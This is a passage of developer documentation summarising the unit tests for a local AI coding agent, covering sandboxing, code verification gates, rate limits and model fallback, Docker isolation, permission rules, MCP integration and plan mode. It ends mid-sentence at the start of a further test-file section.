# `tests/` — proving the agent works without a model

**Role:** these tests run in seconds and need no Ollama. A scripted fake model plays the LLM, and a tiny local HTTP
server imitates Ollama / OpenAI responses, so the loop, the verification gates, the safety rules and the real network
code are all exercised deterministically.

Run: `python -m unittest discover -s tests -t .` (use the venv's Python so the ruff/mypy layers are tested too).

## `tests/__init__.py`
@@ tests/__init__.py 1-1 @@
- Makes `tests` a package so `discover -t .` can import it and tests can import each other's helpers.

---
# `tests/test_agent.py` — core behaviour

## Helpers
@@ tests/test_agent.py header @@
- Imports the code under test. `GOOD` is valid code that prints 5. `BAD_SYNTAX` has a missing colon. `BAD_SCOPE` is a
  `return` outside a function: it *parses* but fails to *compile*, proving the compile stage is stronger than parsing.

@@ tests/test_agent.py make_box @@
- Builds a `ToolBox` on a temporary folder that auto-approves running code; extra keyword arguments tweak the config.

@@ tests/test_agent.py tool_call @@
- Builds the assistant message Ollama would send when the model asks for one tool.

@@ tests/test_agent.py FakeBackend @@
@@ tests/test_agent.py FakeBackend.__init__ @@
@@ tests/test_agent.py FakeBackend.chat @@
- Replays a fixed list of assistant messages, one per `chat` call, with fixed token counts. It satisfies `ChatBackend`,
  which is why the agent accepts it.

## Sandbox
@@ tests/test_agent.py SandboxTests @@
@@ tests/test_agent.py SandboxTests.test_escape_is_blocked @@
@@ tests/test_agent.py SandboxTests.test_inside_is_allowed @@
@@ tests/test_agent.py SandboxTests.test_truncate_keeps_both_ends @@
- A `..` escape must raise `SandboxError`; a nested path must stay inside the root; `truncate` must keep both the start
  and the end and mention what was omitted.

## Verification layers
@@ tests/test_agent.py VerifyTests @@
@@ tests/test_agent.py VerifyTests.check @@
@@ tests/test_agent.py VerifyTests.test_good_code_passes @@
@@ tests/test_agent.py VerifyTests.test_syntax_error_reports_line @@
@@ tests/test_agent.py VerifyTests.test_scope_error_caught_by_compile @@
@@ tests/test_agent.py VerifyTests.test_undefined_name_caught_by_ruff @@
- `check` writes source to a temp file and verifies it. Good code passes; a syntax error fails and names `m.py:1`; the
  scope error is caught by the compile stage; and — only when ruff is installed — `print(missing_name)` is rejected
  with rule `F821`, proving the second layer really runs.

## The write/run gates
@@ tests/test_agent.py ToolBoxTests @@
@@ tests/test_agent.py ToolBoxTests.test_bad_write_is_rejected_and_rolled_back @@
@@ tests/test_agent.py ToolBoxTests.test_bad_overwrite_restores_previous_content @@
@@ tests/test_agent.py ToolBoxTests.test_attempts_exhausted_says_stop @@
- A bad new file gives `REJECTED (1/3)` and does not exist afterwards (rollback). A bad *overwrite* restores the earlier
  good content. After three failures the message contains `STOP`.

@@ tests/test_agent.py ToolBoxTests.test_good_write_then_run @@
@@ tests/test_agent.py ToolBoxTests.test_run_refuses_file_broken_behind_our_back @@
@@ tests/test_agent.py ToolBoxTests.test_denied_when_user_says_no @@
- A good write passes verification and running it prints `5`. A broken file created behind the agent's back is refused
  at run time (`NOT RUN`) — the second check. When the user declines, running returns `DENIED`.

@@ tests/test_agent.py ToolBoxTests.test_edit_requires_unique_match @@
@@ tests/test_agent.py ToolBoxTests.test_path_escape_returns_error_string @@
@@ tests/test_agent.py ToolBoxTests.test_unknown_tool_and_bad_args @@
- `edit_file` refuses an ambiguous match (2 hits) and accepts a unique one. Path escapes, unknown tools and missing
  arguments all come back as error *strings*, never exceptions.

## The loop
@@ tests/test_agent.py AgentLoopTests @@
@@ tests/test_agent.py AgentLoopTests.test_reject_fix_run_finish @@
- **The key scenario:** the scripted model writes bad code, sees `REJECTED`, writes good code, runs it, and gives a
  final answer. Asserts 4 model calls and the content of each tool result in order.

@@ tests/test_agent.py AgentLoopTests.test_max_turns_stops_endless_loop @@
@@ tests/test_agent.py AgentLoopTests.test_string_arguments_are_accepted @@
- A model that never stops is halted by `max_turns` with a "Stopped after 3" message. Arguments sent as a JSON *string*
  are accepted.

## Phase 3/4 tools
@@ tests/test_agent.py Phase3ToolTests @@
@@ tests/test_agent.py Phase3ToolTests.test_outline_lists_classes_and_functions @@
@@ tests/test_agent.py Phase3ToolTests.test_multi_edit_applies_all_or_nothing @@
@@ tests/test_agent.py Phase3ToolTests.test_edit_file_all_renames_every_occurrence @@
@@ tests/test_agent.py Phase3ToolTests.test_auto_format_rewrites_style @@
@@ tests/test_agent.py Phase3ToolTests.test_writes_counter_and_read_only_flags @@
- `outline` lists a class, its method and a top-level function, and reports a missing path as an error.
- `multi_edit` applies two edits in order; a later failing edit (`edit 2`) leaves the file untouched (all-or-nothing);
  an empty list is refused. Auto-format is switched off here so the exact text can be compared.
- `edit_file` with a name that occurs twice is refused with an `all=true` hint; with `all=true` both occurrences are
  renamed. (An earlier draft of this test renamed the letter `f`, which also broke `from`; the write gate rejected it -
  a handy live demonstration that the gate works.)
- Auto-format (only when ruff is installed): `x   =   1` is rewritten to `x = 1` after the write passes verification.
- The `writes` counter counts a plain text write but not a rejected Python write; `search` is flagged read-only and
  `write_file` is not.

@@ tests/test_agent.py Phase3AgentTests @@
@@ tests/test_agent.py Phase3AgentTests.make_agent @@
@@ tests/test_agent.py Phase3AgentTests.test_nudge_when_change_requested_but_nothing_written @@
@@ tests/test_agent.py Phase3AgentTests.test_no_nudge_for_questions @@
@@ tests/test_agent.py Phase3AgentTests.test_parallel_read_only_calls_keep_order @@
@@ tests/test_agent.py Phase3AgentTests.test_repeated_identical_edit_is_refused_then_stopped @@
- `make_agent` builds an agent on a temp folder around a scripted fake model.
- **Nudge:** for "Fix the bug" the model first answers in text only; the agent injects the `NUDGE` message, the model
  then writes a file and the final answer is "done". For the question "Why is the sky blue?" there is no nudge and the
  first answer is returned.
- **Parallel reads:** two `read_file` calls in one turn produce results `1: AAA` and `1: BBB` in the original order, and
  two `->` progress events are reported.
- **Repeat guard:** a model that sends the identical `edit_file` four times gets one `OK`, then three
  `ERROR: you already made this exact call` results, and the request ends with the "repeating" stop message.

## The `finish` tool and escalation
@@ tests/test_agent.py FinishToolTests @@
@@ tests/test_agent.py FinishToolTests.make_agent @@
@@ tests/test_agent.py FinishToolTests.test_finish_in_same_turn_saves_a_call @@
@@ tests/test_agent.py FinishToolTests.test_finish_refused_when_a_call_failed @@
@@ tests/test_agent.py FinishToolTests.test_finish_refused_when_nothing_was_changed @@
@@ tests/test_agent.py FinishToolTests.test_finish_waits_until_what_was_read_has_been_seen @@
@@ tests/test_agent.py FinishToolTests.test_failure_detection @@
@@ tests/test_agent.py FinishToolTests.test_repeated_failures_escalate_once @@
- Write + run + finish in one response: the request ends after **one** model call with the summary, and the history
  ends with the `OK: finished` tool result (still a valid conversation).
- A finish next to a rejected write is refused once (`NOT FINISHED`); the corrected turn finishes.
- "Create n.txt" answered with an immediate finish is refused (nothing written); a question may finish at once.
- A question answered with `read_file` + `finish` in one response is refused once (the reason names `read_file`);
  the answer given after seeing the file is the one returned.
- `failed` recognises every failure form and accepts successes, `exit code 0` and empty text.
- A fake backend with `escalate`/`reset_route`: two failing runs trigger exactly one "stronger model" event, and the
  route is reset once at the start of the request.

@@ tests/test_agent.py footer @@
- Lets you run the file directly.

---
# `tests/test_phase2.py` — streaming, backends, context, undo, sessions, search, evals

## A fake model server
@@ tests/test_phase2.py header @@
- Imports the standard-library HTTP server pieces plus the modules under test. `FIZZ_CODE` is a correct fizzbuzz used by
  the eval-harness test.

@@ tests/test_phase2.py FakeServer @@
@@ tests/test_phase2.py FakeServer.__init__ @@
- Starts a real HTTP server on a free port (`("127.0.0.1", 0)`) in a background thread. Its handler records each
  request's JSON body and headers and replies with a canned status and body — so `post()` and the clients are tested
  against genuine sockets. `log_message` is silenced to keep test output clean.

@@ tests/test_phase2.py FakeServer.close @@
@@ tests/test_phase2.py ndjson @@
- `close` stops the server. `ndjson` encodes dictionaries as one-JSON-object-per-line bytes, Ollama's streaming format.

## Ollama client
@@ tests/test_phase2.py OllamaClientTests @@
@@ tests/test_phase2.py OllamaClientTests.test_streams_text_and_counts_tokens @@
@@ tests/test_phase2.py OllamaClientTests.test_collects_tool_calls @@
@@ tests/test_phase2.py OllamaClientTests.test_http_error_becomes_llm_error @@
@@ tests/test_phase2.py OllamaClientTests.test_unreachable_server_becomes_llm_error @@
@@ tests/test_phase2.py OllamaClientTests.test_error_line_in_stream @@
- Text pieces reach the callback in order and are joined; token counts come from the final line; the request asked for
  streaming. Tool calls are collected. A 404, an unreachable port (9) and an `{"error": ...}` line each become `LLMError`.

## Doctor
@@ tests/test_phase2.py DoctorTests @@
@@ tests/test_phase2.py DoctorTests.tags @@
@@ tests/test_phase2.py DoctorTests.test_healthy_when_model_installed @@
@@ tests/test_phase2.py DoctorTests.test_untagged_name_means_latest @@
@@ tests/test_phase2.py DoctorTests.test_missing_model_gives_pull_command @@
@@ tests/test_phase2.py DoctorTests.test_unreachable_server_is_reported @@
- `tags` starts a fake server whose `/api/tags` lists the given models (the fake server also answers `GET` for this).
  The doctor is healthy when the model is installed, treats `tinyllama` as `tinyllama:latest`, prints the exact
  `ollama pull` command when the model is missing, and reports an unreachable server as a failure.

## OpenAI-compatible client and registry
@@ tests/test_phase2.py OpenAIClientTests @@
@@ tests/test_phase2.py OpenAIClientTests.test_round_trip_with_tool_call_and_auth @@
@@ tests/test_phase2.py OpenAIClientTests.test_message_conversion @@
@@ tests/test_phase2.py BackendRegistryTests @@
@@ tests/test_phase2.py BackendRegistryTests.test_known_and_unknown @@
- Tool calls and usage numbers parse correctly and the bearer token is sent. Conversion turns dict arguments into JSON
  text and keeps the tool-call id link. The registry builds the right class per name and rejects unknown names.

## Context, undo, sessions
@@ tests/test_phase2.py ContextTests @@
@@ tests/test_phase2.py ContextTests.test_prompt_contains_tree_and_notes @@
@@ tests/test_phase2.py ContextTests.test_tree_is_capped @@
- The system prompt includes files and `AGENT.md` text but not `__pycache__`; the tree is capped with `...`.

@@ tests/test_phase2.py CheckpointTests @@
@@ tests/test_phase2.py CheckpointTests.test_undo_restores_deletes_and_recreates @@
- After modifying one file, deleting another and creating a third, `undo` restores the first two, removes the third,
  reports 2 restored, and a second `undo` says nothing to undo.

@@ tests/test_phase2.py SessionTests @@
@@ tests/test_phase2.py SessionTests.test_log_and_resume @@
@@ tests/test_phase2.py SessionTests.test_latest_of_empty_folder @@
- A run is logged as user + assistant messages; a fresh agent restores them and still starts with a system message. An
  empty folder has no latest session.

## Search, workspace check, ids
@@ tests/test_phase2.py SearchAndWorkspaceTests @@
@@ tests/test_phase2.py SearchAndWorkspaceTests.test_search_finds_lines_and_reports_bad_regex @@
@@ tests/test_phase2.py SearchAndWorkspaceTests.test_check_workspace_lists_broken_files @@
@@ tests/test_phase2.py SearchAndWorkspaceTests.test_agent_assigns_tool_call_ids @@
- `search` finds `file:line: text`, reports "no matches", and reports a bad regex politely. `check_workspace` returns
  exactly the broken file. The agent gives every tool call an id starting with `call_`.

## Eval harness
@@ tests/test_phase2.py EvalHarnessTests @@
@@ tests/test_phase2.py EvalHarnessTests.test_passing_run_is_scored_pass @@
@@ tests/test_phase2.py EvalHarnessTests.test_do_nothing_run_is_scored_fail @@
- A scripted "model" that writes correct fizzbuzz is scored PASS (2 calls); one that does nothing is scored FAIL —
  proving the scoreboard can tell good runs from bad ones. The do-nothing model is asked twice (2 calls) because the
  first useless answer to a "Create ..." request triggers the nudge; the second one still changes nothing.

@@ tests/test_phase2.py footer @@
- Lets you run the file directly.

---
# `tests/test_server.py` — the HTTP service

**Role:** proves the API, the token check and the per-session isolation using a real local socket (port 0 = any free
port) and a scripted fake model, so no model server is needed.

## Helpers
@@ tests/test_server.py header @@
- Imports the standard-library HTTP client, the server pieces, and the fake model helpers from `test_agent.py`.

@@ tests/test_server.py call @@
- Sends one request (optionally with a JSON body and bearer token) and returns `(status, parsed JSON)`. HTTP error codes
  are returned instead of raised so tests can assert on 401/404/400.

## Tests
@@ tests/test_server.py ServerTests @@
@@ tests/test_server.py ServerTests.start @@
- `start` builds a manager whose backend factory always returns the same scripted fake, launches the server on a daemon
  thread, registers cleanup, and returns its base URL. A temp folder holds the session workspaces.

@@ tests/test_server.py ServerTests.test_health_needs_no_token @@
@@ tests/test_server.py ServerTests.test_requests_without_token_are_rejected @@
- `/health` works without a token; creating a session or listing files without a token, or with a wrong one, gives 401.

@@ tests/test_server.py ServerTests.test_full_conversation_creates_files @@
- Create a session (201), send "Create hello.txt" (the fake model writes the file, then answers "created"): the reply
  has the answer, 2 model calls and a `write_file` event, and the files endpoint lists `hello.txt`.

@@ tests/test_server.py ServerTests.test_bad_requests @@
- Blank text and a missing `text` field → 400; unknown session ids → 404 for both messages and files; unknown paths → 404
  for GET and POST.

@@ tests/test_server.py ServerTests.test_sessions_have_separate_workspaces @@
- With no token configured, two sessions are created and only the first receives a file; the second session's file list is
  empty - isolation works.

@@ tests/test_server.py SessionLimitTests @@
@@ tests/test_server.py SessionLimitTests.manager @@
@@ tests/test_server.py SessionLimitTests.test_idle_sessions_expire_and_activity_keeps_them @@
@@ tests/test_server.py SessionLimitTests.test_close_all_closes_every_session @@
@@ tests/test_server.py SessionLimitTests.test_session_limit_returns_429_and_frees_after_expiry @@
- `manager` builds a `SessionManager` with a fake model and a clock the test controls (a one-item list).
- **Expiry:** two sessions with a 100 s TTL; at t=80 one is touched (renewing it); at t=150 the touched one is still alive
  (70 s idle) and the untouched one is gone (150 s idle).
- **Shutdown:** `close_all` closes both sessions' toolboxes (recorded by replacing `close` with a function that notes
  the session id; the `sid=session_id` default fixes each id at definition time) and forgets the sessions.
- **Limit:** with `max_sessions=1` over real HTTP, the second `POST /sessions` returns 429; after the clock passes the TTL
  the first session has expired, so creating a session succeeds again (201).

@@ tests/test_server.py footer @@
- Lets you run the file directly.

---
# `tests/test_phase4.py` — Gemini limits, retries, fallback, and the Docker sandbox

**Role:** proves the hosted-model safety net and the sandbox without spending real quota: a fake clock replaces real
waiting, scripted fake models replace Gemini, and the local fake HTTP server checks the exact wire format. Only the
last test uses real Docker, and it is skipped automatically when Docker is not running.

## Helpers
@@ tests/test_phase4.py header @@
- Imports the modules under test and `FakeServer` from `test_phase2.py`.

@@ tests/test_phase4.py FakeClock @@
@@ tests/test_phase4.py FakeClock.__init__ @@
@@ tests/test_phase4.py FakeClock.__call__ @@
@@ tests/test_phase4.py FakeClock.sleep @@
- A clock that only moves when told. Calling it returns the current fake time; `sleep(s)` records `s` and moves time
  forward by `s`, so a 60-second rate-limit wait finishes instantly but is still measured.

## Rate limiter
@@ tests/test_phase4.py RateLimiterTests @@
@@ tests/test_phase4.py RateLimiterTests.test_requests_per_minute_wait @@
@@ tests/test_phase4.py RateLimiterTests.test_tokens_per_minute_wait_and_too_big_request @@
@@ tests/test_phase4.py RateLimiterTests.test_daily_quota_persists_and_resets_next_day @@
@@ tests/test_phase4.py RateLimiterTests.test_mark_exhausted_and_pacific_day @@
- With 2 requests/minute, the third request waits exactly 60 s.
- With 1000 tokens/minute, two 600-token requests cannot share a minute (the second waits); a 5000-token request is
  refused outright.
- Daily quota of 2: after two requests a *new* limiter reading the same file is exhausted (the count survived a
  "restart") and refuses with `QuotaExhausted`; the status line shows requests and tokens; another model has its own
  counter; one day later the quota is free again.
- `mark_exhausted` works, and timestamp 0 (midnight UTC, 1 Jan 1970) is still 31 Dec 1969 in California.

## Fallback chain
@@ tests/test_phase4.py ScriptedBackend @@
@@ tests/test_phase4.py ScriptedBackend.__init__ @@
@@ tests/test_phase4.py ScriptedBackend.chat @@
@@ tests/test_phase4.py reply @@
- `ScriptedBackend` returns or raises prepared items in order and counts calls; `reply` makes a simple answer worth
  10 + 5 tokens.

@@ tests/test_phase4.py FallbackTests @@
@@ tests/test_phase4.py FallbackTests.run_chain @@
@@ tests/test_phase4.py FallbackTests.test_retries_busy_model_then_succeeds @@
@@ tests/test_phase4.py FallbackTests.test_server_retry_delay_is_respected @@
@@ tests/test_phase4.py FallbackTests.test_falls_back_after_retries_and_on_daily_quota @@
@@ tests/test_phase4.py FallbackTests.test_exhausted_model_is_skipped_without_a_call @@
@@ tests/test_phase4.py FallbackTests.test_bad_request_is_not_hidden_and_all_failing_explains @@
@@ tests/test_phase4.py FallbackTests.test_server_daily_limit_is_learned_and_announced @@
@@ tests/test_phase4.py FallbackTests.test_per_model_limit_overrides @@
@@ tests/test_phase4.py FallbackTests.test_limiter_counts_tokens_of_successful_calls @@
- `run_chain` builds a chain whose sleeps are recorded instead of performed.
- A 503 then success: 2 calls, one 2-second pause, `last_model` set.
- A 429 saying `retryDelay: 17s` waits 18 s (17 + 1 safety second).
- Chain of three: the first model stays busy (1 try + 2 retries = 3 calls), the second reports a *per-day* 429 (its
  limiter becomes exhausted), the third (the "local" one) answers.
- An exhausted model is skipped with zero calls; `status()` lists the rate-limited model.
- An HTTP 400 is raised immediately (status preserved); when every model fails the error says "every model failed";
  an empty chain is refused.
- A per-day 429 carrying `"quotaValue": "20"` (the exact shape Google sent) marks the model exhausted, its status
  shows `1/20` and "used up", and a notice names Google's limit. Per-model overrides parse with or without spaces,
  unknown models get the defaults, and a malformed entry explains the format.
- A successful call records 15 tokens and 1 request; the size estimate is about 4 characters per token.

## Routing
@@ tests/test_phase4.py RoutingTests @@
@@ tests/test_phase4.py RoutingTests.test_escalation_puts_strong_models_first_until_reset @@
@@ tests/test_phase4.py RoutingTests.test_strong_models_are_tried_after_cheap_ones_fail @@
@@ tests/test_phase4.py RoutingTests.test_missing_model_is_skipped_for_good @@
@@ tests/test_phase4.py RoutingTests.test_per_minute_limit_is_learned @@
- Cheap answers first; after `escalate()` (which reports `True` once) the strong model answers; after `reset_route()`
  the cheap one again. Status covers both; a chain without reserve cannot escalate.
- When the cheap model is used up, the strong reserve is still tried before giving up.
- A model answering 404 is asked once, announced, and never asked again; the next model answers both requests.
- A per-minute 429 with `quotaValue` 5 lowers the limiter from 12 to 5; a higher value never raises it again.

## Gemini wire format
@@ tests/test_phase4.py GeminiWireTests @@
@@ tests/test_phase4.py GeminiWireTests.test_thought_signature_round_trip_reasoning_and_hidden_tokens @@
@@ tests/test_phase4.py GeminiWireTests.test_missing_signatures_get_placeholder_only_for_gemini @@
@@ tests/test_phase4.py GeminiWireTests.test_gemini_backend_needs_key_and_labels @@
@@ tests/test_phase4.py GeminiWireTests.test_doctor_reports_missing_key @@
@@ tests/test_phase4.py GeminiWireTests.test_doctor_treats_a_missing_backup_as_a_note @@
- Against the fake server: `reasoning_effort` is sent; the tool call's `extra_content` (thought signature) is kept on
  the stored message and sent back by `to_openai`; with 60 prompt + 20 completion but 150 total tokens, 90 are counted
  as completion (70 hidden thinking + 20).
- A tool call without a signature is sent unchanged to ordinary servers, but gets Google's placeholder signature when
  `fill_signatures` is on.
- The Gemini backend refuses to start without a key, builds a `FallbackBackend` with one, labels the chain correctly,
  and rejects an unknown fallback name. The doctor reports a missing key as a failure.
- With Gemini answering (its model list is faked with `mock.patch`) but the backup unavailable, the doctor stays
  healthy, prints no `FAIL`, and prints a `note` about the backup. "Unavailable" is faked too — no server answers and
  no llama.cpp is found — because the backup check now also counts a local model that *could be started*: on a
  computer with llama.cpp installed (like the reference laptop) the backup really is available.

## Runners
@@ tests/test_phase4.py RunnerTests @@
@@ tests/test_phase4.py RunnerTests.test_local_runner_refuses_shell_and_toolbox_hides_tool @@
@@ tests/test_phase4.py RunnerTests.test_docker_toolbox_offers_shell @@
@@ tests/test_phase4.py RunnerTests.test_docker_sandbox_isolation_end_to_end @@
- Locally the shell is refused (code 126) and the `run_shell` tool is not even offered to the model.
- With `sandbox="docker"` the tool is offered and an empty command is rejected — without starting a container.
- **Real Docker (skipped unless Docker runs *and* the sandbox image is built — CI's `sandbox` job builds it):** a
  written file runs in the container and prints `from container`; `id -u && pwd` shows a user id other than 0 (not
  root) in `/work`; opening a web page fails (no network); `sleep 30` with a 2-second limit returns the timeout code
  124. The container is removed in `finally`. The user is checked by its number, not by the name `agent`: on Linux the
  container runs as your own user id (see `runners.md`).

@@ tests/test_phase4.py footer @@
- Lets you run the file directly.

---
# `tests/test_phase7.py` — the Claude-Code-like features

**Role:** proves the features that make the agent usable in any real project folder: fast folder walking, checks for
more languages, the `todo` checklist, the opt-in shell on this computer, compaction, `/init` and the defaults.
No model and no network are needed (scripted fakes again); the JavaScript test runs only when Node.js is installed.

## Helpers
@@ tests/test_phase7.py header @@
- Imports the pieces under test and the fake model helpers from `test_agent.py`.

@@ tests/test_phase7.py box_for @@
- A toolbox on a temporary folder that approves everything; extra settings can be passed.

## Folder walking
@@ tests/test_phase7.py WalkTests @@
@@ tests/test_phase7.py WalkTests.test_skipped_folders_are_never_entered @@
@@ tests/test_phase7.py WalkTests.test_search_uses_glob_on_file_names @@
- A project with `node_modules`, `.localagent` and `venv` folders: only `README.md` and `src/app.py` are found (sorted),
  the prompt's file list shows exactly those two, and a change inside `node_modules` is invisible to `/undo` snapshots.
- `search` with `glob: *.js` finds a match in a JavaScript file; the default (`*.py`) does not look at it.

## Languages
@@ tests/test_phase7.py LanguageTests @@
@@ tests/test_phase7.py LanguageTests.check @@
@@ tests/test_phase7.py LanguageTests.test_json_and_toml @@
@@ tests/test_phase7.py LanguageTests.test_javascript_with_node @@
@@ tests/test_phase7.py LanguageTests.test_bad_json_write_is_rolled_back_and_workspace_check_sees_it @@
- `check` writes a file and runs `verify_file` on it.
- Valid JSON/TOML pass; a trailing comma in JSON and a missing TOML value fail (the TOML failure only on Python
  3.11+, which has a TOML reader built in — CI's Python 3.10 job showed the test assumed it); a Markdown file is never
  checked.
- With Node.js: valid JavaScript passes, `const x = ;` fails.
- Writing broken JSON is rejected and rolled back (the file does not exist); a broken JSON file made outside the agent is
  reported by the end-of-request workspace check.

## Todo and shell
@@ tests/test_phase7.py TodoAndShellTests @@
@@ tests/test_phase7.py TodoAndShellTests.test_todo_checklist @@
@@ tests/test_phase7.py TodoAndShellTests.test_host_shell_is_opt_in_and_asks @@
@@ tests/test_phase7.py TodoAndShellTests.test_todo_progress_is_shown_in_full @@
- The checklist renders as `TODO 1/2 done` + `[x]`/`[ ]` lines; an empty list is an error; plain-text items work too
  (the real model sent plain strings the first time).
- Without `--allow-shell` there is no `run_shell` tool. With it, `echo hello-shell` runs (through PowerShell on
  Windows), and the approval question contained the command. A runner without the flag refuses with code 126.
- When the model sends a checklist, every line of it reaches the progress display.

## Compaction and notes
@@ tests/test_phase7.py CompactionTests @@
@@ tests/test_phase7.py CompactionTests.make @@
@@ tests/test_phase7.py CompactionTests.test_manual_compact_replaces_history_with_summary @@
@@ tests/test_phase7.py CompactionTests.test_empty_summary_keeps_history @@
@@ tests/test_phase7.py CompactionTests.test_automatic_compaction_before_a_request @@
@@ tests/test_phase7.py CompactionTests.test_reset_and_refresh_reload_agent_notes @@
- A fresh agent has nothing to compact. After two requests, `compact()` leaves exactly system + summary + "Understood",
  with the model's summary inside.
- An empty summary changes nothing.
- With a tiny context (1000 tokens) and `compact_at=0.1`, the fourth request is preceded by an automatic summary (a
  progress line says so) and still gets its answer.
- After `AGENT.md` appears, `refresh_system` puts its text in the system prompt; `reset` keeps it and clears the rest.

## Any-folder defaults
@@ tests/test_phase7.py AnyFolderTests @@
@@ tests/test_phase7.py AnyFolderTests.test_defaults_work_in_current_folder_with_global_quota_file @@
@@ tests/test_phase7.py AnyFolderTests.test_usage_file_can_be_moved_by_environment @@
- The workspace defaults to the current folder; the quota file lives in the home folder; `--allow-shell` reaches the
  config; `/init`'s request asks for `AGENT.md`.
- `LOCALAGENT_USAGE_FILE` moves the quota file (the test restores the environment afterwards).

@@ tests/test_phase7.py footer @@
- Lets you run the file directly.

---
# `tests/test_phase8.py` — permissions, web pages, MCP, plan mode, interrupts, diffs, CLI helpers

**Role:** proves the Claude-Code-style features of the latest phase without a model or the internet: a local web server
stands in for websites, and a tiny MCP server written inside this file stands in for real MCP servers.

## Helpers
@@ tests/test_phase8.py header @@
- Imports the pieces under test. `FAKE_MCP_SERVER` is the full source of a minimal MCP server: it answers the
  handshake (first sending the client a question of its own, `roots/list`, to prove the client copes), lists its tools
  in **two pages** (`echo` with a deliberately messy schema, then `fail`), echoes text, and reports an error result
  for `fail` (with an image part, to test that non-text content is named, not dumped).

@@ tests/test_phase8.py write_server @@
- Saves that source to a temporary file and returns the command that starts it with this Python.

## Permissions
@@ tests/test_phase8.py PermissionTests @@
@@ tests/test_phase8.py PermissionTests.test_rules_match_tools_and_subjects @@
@@ tests/test_phase8.py PermissionTests.test_suggested_rules_are_narrow @@
@@ tests/test_phase8.py PermissionTests.test_settings_merge_and_always_allow_is_saved @@
@@ tests/test_phase8.py PermissionTests.test_toolbox_applies_rules_before_asking @@
- Rule parsing and matching, wildcard tool names (`mcp__files__*`), and **deny beats allow**; unmatched → ask.
- "Always" suggestions: the exact command, the whole website, the bare `run_tests`.
- A user file (deny + an MCP server) and a project file (allow) merge; `always_allow` appends to the project file on
  disk; a broken project file is reported as invalid JSON.
- In the toolbox: a denied `run_python` is refused without asking, an allowed `run_tests` runs without asking, and with
  the allow rule removed the question arrives as an `Approval` carrying tool and subject; a "no" gives `DENIED`.

## Web pages
@@ tests/test_phase8.py WebTests @@
@@ tests/test_phase8.py WebTests.serve @@
@@ tests/test_phase8.py WebTests.test_html_becomes_visible_text @@
@@ tests/test_phase8.py WebTests.test_fetch_and_errors @@
@@ tests/test_phase8.py WebTests.test_fetch_tool_asks_and_obeys_rules @@
- `serve` starts a local web server that answers every request with a chosen status, body and content type.
- A page with a title, a style block, bold text, a script and a list becomes exactly
  `Title / Hello world / one` (the script text never appears).
- Fetching HTML and plain text works; a 404 and a `file://` address raise readable errors.
- Through the tool: approved → page text; nobody to approve → `DENIED`; a deny rule → refused; an `ftp://` address →
  `ERROR`.

## MCP
@@ tests/test_phase8.py MCPTests @@
@@ tests/test_phase8.py MCPTests.test_schema_cleaning @@
@@ tests/test_phase8.py MCPTests.test_server_tools_through_the_toolbox @@
@@ tests/test_phase8.py MCPTests.test_timeout_and_stopped_server @@
- Schema cleaning drops `$schema`/`additionalProperties`, turns `["integer","null"]` into integer + nullable, fills
  missing types, and replaces a missing schema with "no arguments".
- With three configured servers — the fake one, one whose program does not exist, one without a command — the toolbox
  offers `mcp__fake__echo` and `mcp__fake__fail` (from both pages), the echo works, the failing tool returns `ERROR`,
  the notes report 2 tools and both skipped servers, and a deny rule on `mcp__fake__*` blocks calls.
- A request the server never answers times out with a clear message; after `close` the program has ended, both of
  its pipes are closed (no leaked file handles), and calls fail with `MCPError`.

## Agent features
@@ tests/test_phase8.py RecordingBackend @@
@@ tests/test_phase8.py RecordingBackend.__init__ @@
@@ tests/test_phase8.py RecordingBackend.chat @@
- A fake model that also records which tool names it was offered on each call.

@@ tests/test_phase8.py AgentFeatureTests @@
@@ tests/test_phase8.py AgentFeatureTests.make @@
@@ tests/test_phase8.py AgentFeatureTests.test_plan_mode_is_read_only @@
@@ tests/test_phase8.py AgentFeatureTests.test_restricted_request_offers_only_allowed_tools @@
@@ tests/test_phase8.py AgentFeatureTests.test_repair_answers_unanswered_calls @@
@@ tests/test_phase8.py AgentFeatureTests.test_edits_are_shown_as_a_diff @@
- **Plan mode:** `write_file` is not offered (but `read_file` is); when the model calls it anyway it gets
  `PLAN_ONLY_ERROR`, no file appears, the request was stored with the plan prefix, and the plan is returned.
- **Restricted request** (how `/init` works): with `allowed={write_file}` the model is offered `write_file` but not
  `run_tests`; calling `run_tests` anyway gets `NOT_ALLOWED`; writing `AGENT.md` and finishing works. Plan mode now offers
  the `todo` checklist.
- **Repair:** of two calls only one has a result; `repair` adds `INTERRUPTED` for the other, a second repair finds
  nothing; restoring a "crashed" log repairs it automatically.
- **Diffs:** writing then editing a file shows `+one`, `-two`, `+TWO` and the hunk header on screen, without the
  `+++` header, and none of it reaches the model's tool results; with `diff_lines=2` a 4-line new file shows
  `... 3 more diff lines`.

## CLI helpers
@@ tests/test_phase8.py CliHelperTests @@
@@ tests/test_phase8.py CliHelperTests.test_multiline_input @@
@@ tests/test_phase8.py CliHelperTests.test_session_logs_belong_to_the_project @@
@@ tests/test_phase8.py CliHelperTests.test_shared_setup_helpers @@
@@ tests/test_phase8.py CliHelperTests.test_todo_understands_done_written_in_the_text @@
@@ tests/test_phase8.py CliHelperTests.test_approver_always_saves_a_rule @@
@@ tests/test_phase8.py CliHelperTests.test_auto_configure_uses_what_is_available @@
@@ tests/test_phase8.py CliHelperTests.test_ctrl_c_keeps_the_conversation_usable @@
- A `\`-continued line and a `"""` block are read as multi-line requests; a leading byte-order mark is removed.
- Conversation logs go to `<project>/.localagent/sessions` whatever folder the agent was started from; an absolute
  `state_dir` is used as given.
- The shared helpers: `overlay` skips `None`; `gemini_history` gives Gemini 32K but keeps 8K when the size was chosen
  (flag or `LOCALAGENT_NUM_CTX`, set inside `mock.patch.dict` so the real environment is restored) or the model is
  local; `shell_argv` picks PowerShell on Windows and `sh` elsewhere.
- Checklist items marked `(done)` in the text or starting with `[x]`, or with `done: true`, count as done (`3/4`).
- Answering `a` saves `run_shell(git status)` in memory and in the project file; Enter refuses; `YES` allows.
- With a key, a ready sandbox image and a running local server (simulated with `mock.patch`), automatic setup picks
  gemini + docker + the local fallback + the 32K history budget with four notes; explicit flags are never overridden.
- A model call interrupted by Ctrl+C returns an empty answer and prints the "stopped" message instead of crashing.

## Limits and hints
@@ tests/test_phase8.py LimitsAndHintsTests @@
@@ tests/test_phase8.py LimitsAndHintsTests.test_learned_rpm_is_saved_for_other_runs @@
@@ tests/test_phase8.py LimitsAndHintsTests.test_undefined_name_rejection_suggests_editing_together @@
- A per-minute limit learned by one limiter is used by a new limiter reading the same usage file.
- With ruff installed, a write rejected for an undefined name carries the "edit together" hint.

@@ tests/test_phase8.py footer @@
- Lets you run the file directly.

---
# `tests/test_phase9.py` — many languages, streaming, helpers, custom commands, tiers, big folders

**Role:** proves the breadth features. Language tests run each checker only when its program is installed (this PC has
